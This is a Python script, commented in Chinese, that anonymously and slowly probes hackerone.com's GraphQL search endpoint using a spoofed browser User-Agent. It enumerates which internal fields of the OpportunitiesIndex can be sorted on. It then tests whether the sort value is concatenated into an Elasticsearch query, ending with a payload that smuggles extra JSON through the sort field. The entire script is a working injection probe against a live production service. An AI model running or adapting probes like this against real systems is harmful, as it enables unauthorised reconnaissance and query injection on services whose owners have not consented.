# -*- coding: utf-8 -*-
"""h1x49k3b: opp sort 拼接判别——ES 字符串 sort 语法探测(匿名,慢速)"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, qstr, timeout=20):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        body = r.text.replace('\n', ' ')[:300]
        print(f'--- {name} [{r.status_code} {dt}s] {body}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
    time.sleep(2.5)

# 1. opp 已知字段 sort 全测(判别可排字段集)
for f in ['handle', 'team_id', 'name', 'industry', 'state', 'submission_state', 'cached_response_efficiency_percentage',
          'first_response_time', 'resolved_report_count', 'launched_at', 'database_id', 'triage_active',
          'offers_bounties', 'gold_standard', 'credentials_set_up', 'idv']:
    probe('opp_srt ' + f, '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: %s, direction: DESC }, limit: 1) { total_count } }' % json.dumps(f))

# 2. 字符串 sort 语法判别(拼接信号!)
probe('opp_str_syntax', '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: "handle:desc", direction: DESC }, limit: 1) { total_count } }')
probe('opp_str_multi', '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: "handle:desc,resolved_report_count:asc", direction: DESC }, limit: 1) { total_count } }')
# 3. 特殊字符
probe('opp_str_space', '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: "handle desc", direction: DESC }, limit: 1) { total_count } }')
probe('opp_str_braces', '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: "handle}\\",\\"x\\":{\\"order\\":\\"asc\\"}", direction: DESC }, limit: 1) { total_count } }')
